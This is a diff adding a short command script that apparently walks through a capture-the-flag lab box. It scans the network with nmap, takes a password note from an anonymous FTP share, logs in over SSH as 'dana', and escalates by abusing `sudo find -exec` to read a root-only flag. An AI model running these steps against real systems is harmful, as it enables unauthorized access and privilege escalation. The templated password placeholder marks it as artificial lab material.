@@ -1,0 +1,19 @@
+## find the hosts on the network, then what the new one offers
+nmap -sn 10.10.1.0/24
+nmap -sV 10.10.1.20
+## anonymous FTP: the pub folder has a note with a password
+ftp 10.10.1.20
+anonymous
+guest
+cd pub
+ls
+get new-staff.txt
+bye
+cat new-staff.txt
+## sign in as dana with that password
+ssh -o StrictHostKeyChecking=accept-new dana@10.10.1.20
+{{PW1}}
+cat flag.txt
+sudo -l
+sudo find /root -name flag.txt -exec cat {} \;
+exit
